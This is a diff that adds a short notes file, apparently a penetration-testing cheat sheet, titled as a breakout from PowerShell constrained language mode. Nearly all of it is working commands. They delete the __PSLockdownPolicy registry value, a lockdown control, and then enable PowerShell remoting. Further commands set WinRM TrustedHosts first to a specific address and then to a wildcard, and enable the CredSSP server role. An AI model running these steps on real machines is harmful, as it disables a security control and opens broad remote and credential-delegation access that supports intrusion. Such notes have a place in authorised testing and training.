@@ -1,0 +1,35 @@
+CONSTRAINED LANGUAGE BREAKOUT
+First see the environment in powershell prompt with below command
+
+ls env:
+
+Then remove the key
+
+Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
+
+powershell "Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy"
+
+powershell Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
+
+Now start a new powershell process, and do the below
+
+Now look at the environment again
+
+ls env:
+
+There should no longer be the _PSLockdownPolicy Parameter
+
+--------------
+
+Check for constrained language mode
+
+$ExecutionContext.SessionState.LanguageMode
+
+Enable PSRemoting
+
+Enable-PSRemoting -SkipNetworkProfileCheck  -Force
+winrm s winrm/config/client '@{TrustedHosts="172.16.80.100"}'
+Enable-WSManCredSSP -Role Server
+
+winrm s winrm/config/client '@{TrustedHosts="*"}'
+
